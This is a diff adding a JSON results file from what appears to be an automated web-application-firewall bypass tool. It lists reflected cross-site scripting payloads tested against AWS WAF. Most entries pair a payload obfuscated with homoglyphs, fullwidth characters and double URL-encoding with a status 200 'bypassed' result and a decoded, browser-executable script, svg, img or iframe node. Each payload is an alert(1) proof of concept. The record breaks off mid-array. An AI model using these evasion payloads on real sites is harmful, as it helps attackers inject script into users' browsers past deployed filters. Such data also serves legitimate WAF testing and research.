@@ -1,0 +1,1142 @@
+[
+    {
+        "payload": "％２５３сІMG％２５２０ѕСRіPt％２５３dJаvАЅсrІPt％２５３ааⅼЕrt％２５２８１％２５２９％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMG sCRiPt=JavAScrIPt:alErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img script=\"JavAScrIPt:alErt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сЅСｒІｐT％２５３ｅａⅬｅRT％２５２８１％２５２９％２５３ｃ＆＃４７；ЅСｒｉPT％２５３ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCrIpT>aLeRT(1)</SCriPT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>aLeRT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": ":%20\\');confIRm(1);//",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": ": \\');confIRm(1);//",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "onclick=%２５３ｃIｆｒAMｅ%/ｔWEｂ cocked=%２５３ｄａｌEｒｔ%２５２８１%２５２９%２５３Ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "onclick=<IfrAMe%/tWEb cocked==alErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe%",
+                        "html": "<iframe% tweb=\"\" cocked=\"=alErt(1)\"></iframe%>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25EF%25BD%2591%25EF%25BD%2591%2525%25EF%25BC%2592%25EF%25BC%2595%25EF%25BC%2592%25EF%25BC%2595%25EF%25BC%2592%25EF%25BC%2595%25EF%25BC%2593C%25EF%",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "qq<�%",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сІFRАMЕ％２５２０ЅRС％２５３dJАVАЅСRІPT％２５３аАⅬЕRT％２５２８１％２５２９％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAME SRC=JAVASCRIPT:ALERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JAVASCRIPT:ALERT(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сІFRАmЕ／％２５２а％２５２１５００００％２５２а／ѕrС％２５３DjАVаЅСrіnt％２５３ааⅬеrt％２５２８１％２５２９％２５３е＆vѕRᏃ＝Rvww",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAmE/*!500OO*/srC=jAVaSCrint:aLert(1)>&vsRᏃ=Rvww",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "Upgrade-Insecure-Requests": "1"
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe *!500oo*=\"\" src=\"jAVaSCrint:aLert(1)\">&vsRᏃ=Rvww</iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "onclick%253D",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "onclick=",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ｉｍｇ ｓｒｃ=ｘ ｏｎｅｒｒｏｒ=ａｌｅｒｔ(１)&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;img src=x onerror=alert(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#60;AttriBuTE=&#eX6Spx;phnJCmLWDd5HBgvYDcGXktWVC2nYAxb0pG&#62;%28&#47;sVgb&#60;&#47;AttriBT&#62;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<AttriBuTE=&#eX6Spx;phnJCmLWDd5HBgvYDcGXktWVC2nYAxbOpG>(/sVgb</AttriBT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "attribute=&#ex6spx;phnjcmlwdd5hbgvydcgxktwvc2nyaxbopg",
+                        "html": "<attribute=&#ex6spx;phnjcmlwdd5hbgvydcgxktwvc2nyaxbopg>(/sVgb</attribute=&#ex6spx;phnjcmlwdd5hbgvydcgxktwvc2nyaxbopg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ｉｍｇ ｓｒｃ=ｘ ｏｎｅｒｒｏｒ=ａｌｅｒｔ(１)%２０&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;img src=x onerror=alert(1) >",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CSVG&#47;O nLOAD%253DalE rt%25281%2529+%253E",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/O nLOAD=alE rt(1)+>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg o=\"\" nload=\"alE\" rt(1)+=\"\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "OnClIcKmOuSEovEr%253d",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "OnClIcKmOuSEovEr=",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;p&#６２;&#６０;а　сⅼаѕѕ=&#３４;е２е－truѕtеd－urⅼ&#３４; [hrеf]=&#３４;truѕtеdUrⅼ&#３４;&#６２;Сⅼісk　mе&#６０;/а&#６２;&#６０;&#４７;p&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;p>O;a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click meO;/a>O;/p>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сѕСRІPt％２５３ЕАⅼеRt％２５２８１％２５２９％２５３с／ЅсrіpT％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sCRIPt>AleRt(1)</ScripT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>AleRt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СѕсrІpT％２５３ЕАⅬеrt％２５２８１％２５２９％２５３С／ЅСrіPt％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scrIpT>ALert(1)</SCriPt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALert(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СѕсＲіＰt％２５３ＥＡⅼеrt％２５２８１％２５２９％２５３Ｃ＆＃４７；ѕсＲＩpt％２５３Ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scRiPt>Alert(1)</scRIpt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>Alert(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СЅсrіPt％２５３Еаⅼеrt％２５２８１％２５２９％２５３С／ѕСRіpT％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ScriPt>alert(1)</sCRipT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>alert(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сѕСRІpT％２５３еАⅬЕRT％２５２８１％２５２９％２５３с／ЅсrІpT％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sCRIpT>ALERT(1)</ScrIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;p&#６２;а　сⅼаѕѕ=&#３４;е２е－truѕtеd－urⅼ&#３４；　[hrеf]=&#３４;trusteedUrⅼ&#３４；&#６０;&#４７;а&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;p>a class=\"e2e-trusted-url\" [href]=\"trusteedUrl\"O;/a>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сЅUPport／ОNІggА WikiseiteⅬ％２５３dаⅼЕrt％２５２８１％２５２９％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SUPport/ONIggA WikiseiteL=alErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "support",
+                        "html": "<support onigga=\"\" wikiseitel=\"alErt(1)\"></support>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "JaVASCriPt%25253AaLeRt%2525281%252529",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "JaVASCriPt:aLeRt(1)",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СІFRаmЕ／％２５２А％２５２１５００００％２５２а／ѕсrrpІng％２５３DАⅼеrT％２５２８１％２５２９％２５３Е＆VЅrꮓ＝rVWW",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRamE/*!500OO*/scrrpIng=AlerT(1)>&VSrꮓ=rVWW",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe *!500oo*=\"\" scrrping=\"AlerT(1)\">&VSrꮓ=rVWW</iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сЅСRіPt％２５３еаⅬЕRt％２５２８１％２５２９％２５３С／ѕсRіpT％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCRiPt>aLERt(1)</scRipT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>aLERt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ａ ｃｌａｓｓ=&#３４;ｅ２ｅ-ｔｒｕｓｔｅｄ-ｕｒｌ&#３４; [ｈｒｅｆ]=&#３４;ｔｒｕｓｔｅｄUｒｌ&#３４;&#６２;Cｌｉｃｋ &#６０;＆＃４７;ａ&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click O;/a>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "jAVasCRIpt%253AaLeRt%25281%2529",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "jAVasCRIpt:aLeRt(1)",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ｉｍｇ ｓｒｃ＝ｘ ｏｎｅｒｒｏｒ=ａｌｅｒｔ（１）&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;img src=x onerror=alert(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СѕсRіPt％２５３ЕаⅼеRT％２５２８１％２５２９％２５３С／ЅСRІpT％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scRiPt>aleRT(1)</SCRIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>aleRT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "pHp4%20%20%20...%20.%20..",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "pHp4   ... . ..",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ІMG ѕRС＝Х ОnеrrОR＝АⅼЕrT（１）&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;IMG sRC=X OnerrOR=AlErT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#60;DETAILS%a0ONTOGGLE=ALERT(1)%a0OPEN&#62;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<DETAILS�ONTOGGLE=ALERT(1)�OPEN>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "details�ontoggle=alert(1)�open",
+                        "html": "<details�ontoggle=alert(1)�open></details�ontoggle=alert(1)�open>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%%EF%BC%92%EF%BC%95%EF%BC%92%EF%BC%95%EF%BC%93CBODY%20ONLOAD%3D%EF%BD%81LEX%252520HTMLANCHOR%252520CLICKABLE%252520ID%25253DA%252520OPEN%252521%252523%EF%BC%96%EF%BC%96%2525",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<BODY ONLOAD=aLEX HTMLANCHOR CLICKABLE ID=A OPEN!#66%",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СѕсRіPt％２５３ЕаⅼеRT％２５２８１％２５２９％２５３С／ЅСRіpT％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scRiPt>aleRT(1)</SCRipT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>aleRT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сѕVg／ОnⅬОаD％２５３dАⅼЕrt％２５２８１％２５２９％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sVg/OnLOaD=AlErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"AlErt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25attributeName%25%ef%bc%92%ef%bc%95%ef%bc%93%ef%bd%83%ef%bd%93pa%ef%bd%8cdef%ef%bd%81%ef%bd%93rip%ef%bd%94%25%ef%bc%92%ef%bc%95%ef%bc%93%ef%bd%85%ef%bd%81l%ef%bd%85rt%25%ef%bc%",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "%attributeName<spaldefasript>alert%�%",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "spaldefasript",
+                        "html": "<spaldefasript>alert%�%</spaldefasript>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СЅсrіpT％２５３ЕАⅼеRt％２５２８１％２５２９％２５３С／ѕСrtcІpT％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ScripT>AleRt(1)</sCrtcIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>AleRt(1)</sCrtcIpT></script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３Сѕvg／ОnⅬОАD％２５３DаⅼЕRt％２５２８１％２５２９％２５３Е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/OnLOAD=alERt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"alERt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "onclick%3d",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "onclick=",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%２５３ｃIｍｇ%２５２０ｓｒｃ%２５３ｄｘ%２５２０ｏNERｒOｒ%２５３ｄALｅｒｔ%２５２８１%２５２９%２５３ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<Img src=x oNERrOr=ALert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"ALert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сЅСRіpt％２５３Еаⅼеrt％２５２８１％２５２９％２５３с／ѕСrІpT％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCRipt>alert(1)</sCrIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>alert(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СѕсＲіＰt％２５３ＥＡⅼＥrt％２５２８１％２５２９％２５３Ｃ＆＃４７；ѕсＲＩpt％２５３Ｅ",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scRiPt>AlErt(1)</scRIpt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>AlErt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "&#６０;ｉｍｇ ѕｒｃ＝ｘ ｏｎｅｒｒｏｒ=ａｌｅｒｔ（１）&#６２;",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "O;img src=x onerror=alert(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３сЅСRіpT％２５３еАⅬЕRt％２５２８１％２５２９％２５３с／ѕсRІpT％２５３е",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SCRipT>ALERt(1)</scRIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERt(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "％２５３СІFRаmЕ／％２５２А％２５２１５００００％２５２а／ѕrс％２５３DjаVАѕСrіpT％２５３ААⅬеrt％２５２８１％２５２９％２５３Е＆vѕRᏃ＝Rvww",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRamE/*!500OO*/src=jaVAsCripT:ALert(1)>&vsRᏃ=Rvww",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe *!500oo*=\"\" src=\"jaVAsCripT:ALert(1)\">&vsRᏃ=Rvww</iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CiMg%2520SrC%253Dx%2520OnError%253DAleRt%25281%2529%253E",
+        "technique": "Adaptive Generation",
+        "attack_type": "xss_reflected",
+        "waf": "AWS",
+        "phase": "PHASE_3",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<iMg SrC=x OnError=AleRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"AleRt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
